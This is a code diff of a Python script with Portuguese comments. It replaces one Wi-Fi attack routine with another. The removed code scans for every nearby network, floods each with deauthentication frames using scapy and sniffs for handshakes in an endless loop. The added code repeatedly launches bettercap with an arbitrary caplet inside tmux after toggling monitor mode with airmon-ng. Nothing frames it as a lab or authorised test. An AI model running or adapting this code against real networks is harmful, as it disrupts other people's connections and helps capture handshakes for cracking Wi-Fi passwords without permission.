@@ -1,48 +1,42 @@
 import os
-import time
-from scapy.all import *
+from time import sleep
+import sys
 
-# Defina a interface de rede
-interface = "wlan0"  # Substitua pela sua interface de rede
+def start_tmux_session(interface, caplet):
+    # Start a new tmux session named 'wifi-scan-novo'
+    os.system(f'tmux new-session -d -s wifi-scan-novo')
 
-# Armazena redes já processadas
-captured_networks = set()
+    # List of commands to execute in the tmux session
+    command = f'bettercap -iface {interface} -caplet {caplet}'
 
-def get_networks():
-    """Captura redes Wi-Fi disponíveis."""
-    networks = []
-    # Executa o comando para escanear redes
-    results = os.popen(f"sudo iwlist {interface} scan").read()
-    for line in results.splitlines():
-        if "Cell" in line:
-            bssid = line.split()[5]
-            if bssid not in captured_networks:
-                networks.append(bssid)
-    return networks
+    os.system(f'airmon-ng stop {interface}')
+    sleep(0.5)
+    os.system(f'airmon-ng start {interface}')
+    sleep(0.5)
+    os.system(f'tmux send-keys -t wifi-scan-novo "{command}" C-m')
+    sleep(0.5)
 
-def deauth_attack(target_bssid):
-    """Envia pacotes de desautenticação para a rede alvo."""
-    print(f"Atacando {target_bssid} com pacotes de deauth...")
-    # Envia pacotes de desautenticação
-    sendp(Ether(dst=target_bssid)/Dot11(addr1=target_bssid, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(), iface=interface, count=100)
-
-def capture_handshake(target_bssid):
-    """Captura o handshake da rede alvo."""
-    print(f"Capturando handshake para {target_bssid}...")
-    sniff(iface=interface, prn=lambda x: x.summary(), filter=f"ether host {target_bssid}", count=10)  # Ajuste o count conforme necessário
-
-def main():
-    """Função principal que executa o ataque."""
-    os.system(f"sudo airmon-ng start {interface}")  # Coloca a interface em modo monitor
-
-    while True:
-        networks = get_networks()
-        for network in networks:
-            if network not in captured_networks:
-                captured_networks.add(network)
-                deauth_attack(network)
-                capture_handshake(network)
-        time.sleep(5)  # Aguarda um tempo antes de escanear novamente
+    # Wait for 25 seconds before killing the tmux session
+    sleep(30)
+    os.system('tmux kill-session -t wifi-scan-novo')
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 3:
+        print("Uso: python script.py <interface> <caplet>")
+        sys.exit(1)
+
+    interface = sys.argv[1]
+    caplet = sys.argv[2]
+    
+    try:
+        count = 0
+        while True:
+            start_tmux_session(interface, caplet)
+            count += 1
+            if count >= 5:
+                sleep(3)
+            else:
+                sleep(30)
+    except KeyboardInterrupt:
+        print("Encerrando o script...")
+        sys.exit(0)
